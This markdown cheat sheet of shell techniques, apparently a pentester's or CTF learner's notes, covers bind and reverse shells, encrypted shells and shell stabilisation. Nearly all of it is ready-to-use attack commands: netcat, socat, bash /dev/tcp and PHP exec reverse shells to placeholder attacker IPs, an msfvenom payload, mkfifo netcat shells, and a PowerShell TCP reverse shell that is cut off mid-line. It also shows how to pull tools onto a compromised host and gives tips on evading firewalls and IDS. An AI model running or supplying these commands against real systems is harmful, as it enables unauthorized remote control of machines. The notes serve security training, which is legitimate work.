# Shells


## Bind Shell
Execute a listener on the Target.

The code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

### Snippets

Target:
`nc -lvnp <PORT> -e /bin/bash`

If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. 
Attacker:
`nc <target-ip> <PORT>`

Connecting to the above listener with netcat would result in a bind shell on the target.

Here we are using netcat to make an outbound connection to the target on our chosen port.


#### socat
On a Linux target we would use the following command:
`socat TCP-L:<PORT> EXEC:"bash -li"`

On a Windows target we would use this command for our listener:
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes` (We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.)

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener: `socat TCP:<TARGET-IP>:<TARGET-PORT> -`



















## Reverse Shell
require shellcode and a listener

If you choose to use a port below 1024, you will need to use `sudo` when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.


A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.

A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.



### Snippets


#### netcat
Tip: use `rlwrap` to provide a readline-style editing of the command line
Ex: `sudo rlwrap nc -lvnp 443`

Target:
`nc [ATTACKER IP] 4444 -e /bin/bash`

Attacker:
`sudo nc -lnvp 4444`






#### socat

`socat TCP-L:<port> -` is equivalent to `nc -lvnp <port>`
On Windows: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` (The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.)



#### msfvenom
Example: generate a reverse shell payload using msfvenom:
`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`

-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format


#### Bash
bash -c 'bash -i >& /dev/tcp/[ATTACKER MACHINE IP]/1234 0>&1'

#### PHP - Bash
exec("/bin/bash -c 'bash -i >& /dev/tcp/[ATTACKER MACHINE IP]/1234 0>&1'");
may have to scape the quotes
exec(\"/bin/bash -c 'bash -i >& /dev/tcp/[ATTACKER MACHINE IP]/1234 0>&1'\");












## Encrypted Shell

`socat` is capable of creating encrypted shells, both bind and reverse. 
Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.




















### Shell Stabilisation

```
# step 1
python -c 'import pty;pty.spawn("/bin/bash")' # note that some targets may need the version of Python specified
# step 2
export TERM=xterm # this will give us access to term commands such as clear  
# step 3
stty raw -echo; fg # it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process. Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

```



```
script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
# Then press Enter twice, and then enter:
export TERM=xterm
```






It's also useful to be able to change your terminal tty size. First check the current values with: `stty -a` and then change it with `stty rows NUMBER` and `stty cols NUMBER`.



Another way stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.
























## Payloads

<https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/>



On Linux use this code to create a listener for a BIND SHELL:
`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

A very similar command can be used to send a netcat REVERSE SHELL:
`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

More on `mkfifo`: <https://www.linuxjournal.com/article/2156>


### Powershell REVERSE SHELL
```pwsh
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$s
```




